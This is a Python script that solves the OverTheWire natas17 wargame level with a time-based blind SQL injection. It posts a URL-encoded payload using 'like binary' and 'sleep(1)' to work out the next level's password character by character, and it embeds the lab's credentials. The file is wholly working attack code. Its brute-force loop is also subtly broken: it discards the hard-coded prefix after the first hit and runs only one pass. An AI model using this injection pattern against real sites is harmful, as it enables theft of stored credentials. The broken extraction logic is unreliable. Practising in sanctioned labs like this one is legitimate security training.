import requests
import string
from requests.auth import HTTPBasicAuth

url = "http://natas17.natas.labs.overthewire.org"
username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
headers = {'content-type': 'application/x-www-form-urlencoded'}
#characters = abcdefghijklmnopqrstuvwxyzABCDEFGH
# IJKLMNOPQRSTUVWXYZ0123456789
characters = ''.join([string.ascii_letters,string.digits])

pass_dict = []
exits_str = "This user exists."
for char in characters:
    data = f'username=natas18%22+and+password+like+binary+%22%25{char}%25%22+and+sleep%281%29%23'
    r = requests.post(url, auth=HTTPBasicAuth(username,password), data=data, headers=headers)
    if (r.elapsed.seconds >= 1):
        pass_dict.append(char)
        print(''.join(pass_dict))
        #print(f"Password dict: {''.join(pass_dict)}")
print("Complete")
print(f"Dict: {''.join(pass_dict)}")

#Brute Force
print("Burte Forcing.....")
pass_list = []
passwd = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd'
for i in range (0, 1):
    for char in pass_dict:
        test = ''.join([passwd,char])
        # Build GET requests
        data = f'username=natas18%22+and+password+like+binary+%22{test}%25%22+and+sleep%281%29%23'
        r = requests.post(url, auth=HTTPBasicAuth(username,password), data=data, headers=headers)
        #print(r.text[:10])
        if r.elapsed.seconds >= 1:
            pass_list.append(char)
            passwd = ''.join(pass_list)
            print(f"Length: {len(passwd)}, Passworld: {passwd}")
            break